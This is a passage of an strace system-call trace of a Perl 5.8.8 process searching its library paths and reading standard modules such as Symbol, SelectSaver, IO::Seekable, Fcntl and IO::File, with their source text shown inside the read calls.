11891 07:39:45.170371 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.170371 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.170371 stat64("/usr/lib/perl5/Symbol.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.170371 stat64("/usr/lib/perl5/Symbol.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.170372 stat64("/usr/share/perl5/Symbol.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.170372 stat64("/usr/share/perl5/Symbol.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.170375 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.170387 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.170400 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.170412 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
11891 07:39:45.170433 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 8
11891 07:39:45.170448 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb5c78) = -1 ENOTTY (Inappropriate ioctl for device)
11891 07:39:45.170459 _llseek(8, 0, [0], SEEK_CUR) = 0
11891 07:39:45.170477 read(8, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ > 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined $stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
11891 07:39:45.170915 read(8, "", 4096) = 0
11891 07:39:45.170931 close(8)          = 0
11891 07:39:45.170995 stat64("/etc/perl/SelectSaver.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.171012 stat64("/etc/perl/SelectSaver.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.171026 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.171038 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.171052 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.171065 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.171079 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.171091 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.171104 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.171116 stat64("/usr/share/perl5/SelectSaver.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.171129 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.171141 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.171156 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.171169 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
11891 07:39:45.171190 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 8
11891 07:39:45.171205 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb5c78) = -1 ENOTTY (Inappropriate ioctl for device)
11891 07:39:45.171216 _llseek(8, 0, [0], SEEK_CUR) = 0
11891 07:39:45.171235 read(8, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
11891 07:39:45.171364 brk(0x81d6000)    = 0x81d6000
11891 07:39:45.171394 read(8, "", 4096) = 0
11891 07:39:45.171406 close(8)          = 0
11891 07:39:45.171880 read(6, "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
11891 07:39:45.172636 read(6, "", 4096) = 0
11891 07:39:45.172713 close(6)          = 0
11891 07:39:45.172754 stat64("/etc/perl/IO/Seekable.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.172770 stat64("/etc/perl/IO/Seekable.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.172784 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.172796 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.172810 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.172823 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.172837 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.172848 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.172861 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.172873 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.172886 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.172899 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
11891 07:39:45.172920 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 6
11891 07:39:45.172935 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb6128) = -1 ENOTTY (Inappropriate ioctl for device)
11891 07:39:45.172946 _llseek(6, 0, [0], SEEK_CUR) = 0
11891 07:39:45.172964 read(6, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
11891 07:39:45.173102 stat64("/etc/perl/Fcntl.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.173117 stat64("/etc/perl/Fcntl.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.173130 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.173173 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.173190 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.173216 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.173230 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.173241 stat64("/usr/lib/perl5/Fcntl.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.173254 stat64("/usr/share/perl5/Fcntl.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.173265 stat64("/usr/share/perl5/Fcntl.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.173278 stat64("/usr/lib/perl/5.8/Fcntl.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.173290 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
11891 07:39:45.173310 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 8
11891 07:39:45.173324 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb5c78) = -1 ENOTTY (Inappropriate ioctl for device)
11891 07:39:45.173339 _llseek(8, 0, [0], SEEK_CUR) = 0
11891 07:39:45.173358 read(8, "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
11891 07:39:45.173769 brk(0x81f7000)    = 0x81f7000
11891 07:39:45.173958 read(8, "", 4096) = 0
11891 07:39:45.173972 close(8)          = 0
11891 07:39:45.174044 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
11891 07:39:45.174069 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
11891 07:39:45.174095 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY) = 8
11891 07:39:45.174109 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
11891 07:39:45.174245 fstat64(8, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
11891 07:39:45.174264 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7d8f000
11891 07:39:45.174277 mmap2(0xb7d92000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x2) = 0xb7d92000
11891 07:39:45.174294 close(8)          = 0
11891 07:39:45.174494 read(6, "", 4096) = 0
11891 07:39:45.174509 close(6)          = 0
11891 07:39:45.174540 stat64("/etc/perl/IO/File.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.174555 stat64("/etc/perl/IO/File.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.174569 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.174581 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.174595 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.174607 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.174621 stat64("/usr/lib/perl5/IO/File.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.174632 stat64("/usr/lib/perl5/IO/File.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.174675 stat64("/usr/share/perl5/IO/File.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.174704 stat64("/usr/share/perl5/IO/File.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.174717 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.174729 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
11891 07:39:45.174750 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 6
11891 07:39:45.174764 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb6128) = -1 ENOTTY (Inappropriate ioctl for device)
11891 07:39:45.174775 _llseek(6, 0, [0], SEEK_CUR) = 0
11891 07:39:45.174793 read(6, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode =~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, $mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" $file\\0\";\n    }\n    open($fh, $file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
11891 07:39:45.175031 stat64("/etc/perl/File/Spec.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.175047 stat64("/etc/perl/File/Spec.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.175060 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
